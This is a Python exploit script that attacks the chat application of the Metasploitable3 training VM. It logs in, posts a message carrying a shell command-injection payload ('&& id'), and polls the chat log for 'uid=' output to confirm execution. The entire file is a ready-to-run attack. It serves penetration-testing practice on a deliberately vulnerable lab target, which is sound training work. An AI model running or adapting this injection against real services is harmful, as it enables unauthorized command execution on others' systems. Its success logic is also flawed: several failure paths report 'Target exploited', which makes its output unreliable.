#!/usr/bin/env python3

import requests
import argparse
from html import escape
from bs4 import BeautifulSoup
from time import sleep, time


class Chat:
    def __init__(self, host, port):
        self.__host = host
        self.__port = port
        self.__post = "/chat/post.php"
        self.__logs = "/chat/read_log.php"
        self.__enter = "/chat/index.php"
        self.__name = "toodrunktohack"
        self.__payload = escape("btv+%26%26+id")
        self.__requests = requests.session()

    def __cookie(self):
        r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__enter}")
        if r.status_code != 200:
            return False
        return True

    def __login(self):
        params = {
            "name": self.__name,
            "enter": "Enter"
        }
        r = self.__requests.post(f"http://{self.__host}:{self.__port}{self.__enter}", data=params)
        if r.status_code != 200:
            return False
        return True

    def __read(self):
        r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__logs}")
        if "Papa Smurf" not in r.text:
            return False
        return True 

    def __check(self):
        data = {"_": time()}
        r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__logs}", params=data)
        msgs = BeautifulSoup(r.text, 'lxml').find_all('div')
        # Loop last 10 messsages
        if len(msgs) < 5:
            return True
        for i in msgs[-9:]:
            if "uid=" in i.text:
                return True
        return False

    def __exploit(self):
        whoami = {"text": f"do you know {self.__payload}"}
        r = requests.post(f"http://{self.__host}:{self.__port}{self.__post}", data=whoami, cookies=self.__requests.cookies)
        if r.status_code != 200:
            return True
        sleep(5)
        return self.__check()

    def run(self):
        if not self.__cookie():
            return True
        if not self.__login():
            return True
        if not self.__read():
            return True
        return self.__exploit()


def main(args):
    print("[+] Exploiting Metasploitable3 Chat App by xentrick")
    print(f"[+] Exploiting {args.host}:{args.port}")

    exploit = Chat(args.host, int(args.port))
    if exploit.run():
        print("Target exploited")
    else:
        print("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port")
    args = parser.parse_args()

    main(args)
